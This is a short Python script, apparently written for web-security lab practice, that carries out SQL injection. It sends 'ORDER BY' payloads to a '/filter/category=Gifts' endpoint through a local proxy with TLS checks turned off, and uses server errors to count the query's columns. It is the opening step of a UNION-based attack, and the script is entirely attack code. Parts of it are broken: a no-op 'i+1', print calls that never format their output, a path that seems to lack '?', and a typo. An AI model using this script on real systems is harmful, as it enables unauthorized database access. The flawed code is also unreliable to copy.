import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

def exploit_sqli(url):
    uri = "/filter/category=Gifts"
    for i in range(1,50):
        sqli_payload = "'order+by+%s--" %i
        r = requests.get(url + uri + sqli_payload ,verify=False, proxies=proxies)
        if "Internal Server error" in r.text:
              return i-1
        i+1
    return False
        

if __name__ == "__main__":
    try:
            url = sys.argv[1].strip()
    except IndexError:
            print("[-] Usage: %s url", sys.argv[0])
            sys.exit(-1)
    num_of_column = exploit_sqli(url)
    if num_of_column:
          print("SQL Union injection is successful, number of columns is %s", num_of_column)
    else:
          print("SQL imjection unsuccessful!")